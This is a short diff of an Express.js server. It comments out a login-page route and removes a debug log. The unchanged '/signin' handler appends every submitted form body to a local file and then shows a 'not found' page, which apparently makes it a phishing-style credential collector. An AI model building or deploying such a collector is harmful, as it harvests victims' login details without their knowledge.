@@ -23,15 +23,14 @@ app.get('/not-found', (req,res) => {
     res.sendFile(path.join(__dirname,'notfound.html'))
 });
 
-app.get('/login', (req,res) => {
-    res.sendFile(path.join(__dirname,'login.html'))
-});
+// app.get('/login', (req,res) => {
+//     res.sendFile(path.join(__dirname,'login.html'))
+// });
 
 
 app.post('/signin', (req,res) => {
     console.log('Data',req.body);
     fs.writeFile(__dirname + '/files/file',JSON.stringify(req.body),{flag: 'a'},function(){
-        console.log(__dirname,"dirname")
     }
     )
     res.sendFile(path.join(__dirname,'notfound.html'))
